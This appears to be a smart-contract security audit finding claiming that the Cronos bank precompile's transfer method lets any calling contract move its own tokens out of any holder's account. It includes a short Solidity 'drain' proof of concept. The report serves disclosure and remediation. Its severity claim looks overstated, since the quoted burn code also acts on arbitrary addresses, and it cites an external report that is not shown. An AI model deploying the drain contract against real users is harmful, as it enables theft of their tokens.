### Title
Unauthorized Token Transfer via Missing Sender Authorization in Bank Precompile `transfer` Method - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract.Run()` function in the bank precompile handles a `transfer` method that accepts an arbitrary `sender` address from ABI-decoded input without verifying that the caller is authorized to transfer on behalf of that address. Any EVM contract can invoke the bank precompile's `transfer` method and specify any address as the `sender`, causing the bank module to move `evm/<calling_contract>` tokens from that address to any recipient without the token holder's consent.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` case unpacks three arguments from the ABI-encoded input: `sender`, `recipient`, and `amount`. The `denom` is correctly bound to `EVMDenom(contract.Caller())`, tying the token type to the calling contract. However, the `from` address used in `bankKeeper.SendCoins` is taken directly from the caller-supplied `sender` argument with no check that `sender == contract.Caller()` or that the sender has granted an allowance to the calling contract:

```go
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())          // denom tied to caller ✓
amt := sdk.NewCoin(denom, ...)
...
bc.bankKeeper.SendCoins(ctx, from, to, ...)   // from is attacker-controlled ✗
```

The only authorization performed is that the denom is `evm/<calling_contract>`, meaning the calling contract controls which token type is moved. The identity of the token holder (`from`) is never validated against the calling contract or the EVM transaction originator.

This is a direct analog to the external report's bug class: a validation function uses only a **subset** of the relevant fields (here, the denom/caller), while a critical field (the sender/owner) is left unvalidated and freely manipulable by the attacker. [1](#0-0) 

### Impact Explanation
A malicious EVM contract can:
1. Mint `evm/<malicious_contract>` tokens to victim addresses (via the `mint` method, which is unrestricted as to recipient).
2. Later call `transfer(victim, attacker, balance)` — specifying the victim as `sender` — to drain the victim's entire balance of that token without any consent or allowance from the victim.

Because `evm/<contract>` tokens are precompile-controlled assets that back CRC20 contracts on Cronos, this constitutes an **unauthorized transfer of precompile-controlled assets**, which is Critical per the allowed impact scope. Any user who holds tokens issued by a contract using the bank precompile is at risk of having those tokens stolen by the issuing contract at any time. [2](#0-1) [3](#0-2) 

### Likelihood Explanation
The entry path is fully unprivileged: any EVM account can deploy a contract and call the bank precompile. No admin keys, governance votes, or special permissions are required. The attack is reachable via a standard EVM transaction. The only precondition is that victims hold `evm/<attacker_contract>` tokens, which the attacker can arrange by minting to them first (e.g., as part of a DeFi protocol or airdrop). [4](#0-3) 

### Recommendation
Add an explicit check that the `sender` argument equals `contract.Caller()` (the EVM address of the calling contract), or implement an allowance mechanism. The simplest fix:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
    ...
```

Alternatively, if the intent is to allow a contract to transfer on behalf of a user, an ERC20-style allowance mapping should be maintained and checked before executing `SendCoins`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AttackerContract {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64));

    // Step 1: Mint evm/<this> tokens to victim (e.g., as part of a DeFi protocol)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Drain victim's balance without their consent
    // sender = victim is accepted with no authorization check
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // Succeeds: bankKeeper.SendCoins(victim → attacker, evm/<this>)
        // No check that victim authorized this transfer
    }
}
```

The `transfer` call at step 2 succeeds because `bank.go` uses the caller-supplied `sender` directly as `from` in `bankKeeper.SendCoins` without verifying authorization, mirroring the external report's pattern of an omitted field in the validation logic. [1](#0-0)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L103-131)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
